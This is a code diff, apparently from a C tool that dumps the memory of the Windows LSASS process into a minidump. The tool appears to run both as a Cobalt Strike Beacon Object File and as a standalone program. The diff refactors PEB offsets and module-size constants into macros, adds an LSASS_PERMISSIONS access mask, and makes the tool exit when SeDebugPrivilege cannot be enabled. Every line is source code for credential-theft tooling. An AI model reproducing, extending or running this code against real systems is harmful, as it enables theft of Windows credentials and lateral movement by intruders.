@@ -361,22 +361,12 @@ BOOL write_system_info_stream(
     PULONG32 OSPlatformId;
     PUNICODE_STRING CSDVersion;
     pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
-
-#if _WIN64
-    OSMajorVersion = RVA(PULONG32, pPeb, 0x118);
-    OSMinorVersion = RVA(PULONG32, pPeb, 0x11c);
-    OSBuildNumber = RVA(PUSHORT, pPeb, 0x120);
-    OSPlatformId = RVA(PULONG32, pPeb, 0x124);
-    CSDVersion = RVA(PUNICODE_STRING, pPeb, 0x2e8);
-    system_info.ProcessorArchitecture = AMD64;
-#else
-    OSMajorVersion = RVA(PULONG32, pPeb, 0xa4);
-    OSMinorVersion = RVA(PULONG32, pPeb, 0xa8);
-    OSBuildNumber = RVA(PUSHORT, pPeb, 0xac);
-    OSPlatformId = RVA(PULONG32, pPeb, 0xb0);
-    CSDVersion = RVA(PUNICODE_STRING, pPeb, 0x1f0);
-    system_info.ProcessorArchitecture = INTEL;
-#endif
+    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
+    OSMinorVersion = RVA(PULONG32, pPeb, OSMINORVERSION_OFFSET);
+    OSBuildNumber = RVA(PUSHORT, pPeb, OSBUILDNUMBER_OFFSET);
+    OSPlatformId = RVA(PULONG32, pPeb, OSPLATFORMID_OFFSET);
+    CSDVersion = RVA(PUNICODE_STRING, pPeb, CSDVERSION_OFFSET);
+    system_info.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
 
     system_info.ProcessorLevel = 0;
     system_info.ProcessorRevision = 0;
@@ -494,7 +484,7 @@ Pmodule_info write_module_list_stream(
     ULONG32 stream_rva = dc->rva;
     // write the number of modules
     append(dc, &number_of_modules, 4);
-    byte module_bytes[108];
+    BYTE module_bytes[SIZE_OF_MINIDUMP_MODULE];
     curr_module = module_list;
     while (curr_module)
     {
@@ -855,8 +845,9 @@ void go(char* args, int length)
     {
         BeaconPrintf(
             CALLBACK_ERROR,
-            "Could not enable 'SeDebugPrivilege', continuing anyways..."
+            "Could not enable 'SeDebugPrivilege'"
         );
+        return;
     }
 
     HANDLE hProcess;
@@ -878,7 +869,7 @@ void go(char* args, int length)
         {
             hProcess = get_process_handle(
                 pid,
-                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+                LSASS_PERMISSIONS,
                 FALSE
             );
         }
@@ -1099,8 +1090,9 @@ int main(int argc, char* argv[])
     if (!success)
     {
         printf(
-            "Could not enable 'SeDebugPrivilege', continuing anyways...\n"
+            "Could not enable 'SeDebugPrivilege'\n"
         );
+        return -1;
     }
 
     HANDLE hProcess;
@@ -1122,7 +1114,7 @@ int main(int argc, char* argv[])
         {
             hProcess = get_process_handle(
                 pid,
-                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+                LSASS_PERMISSIONS,
                 FALSE
             );
         }
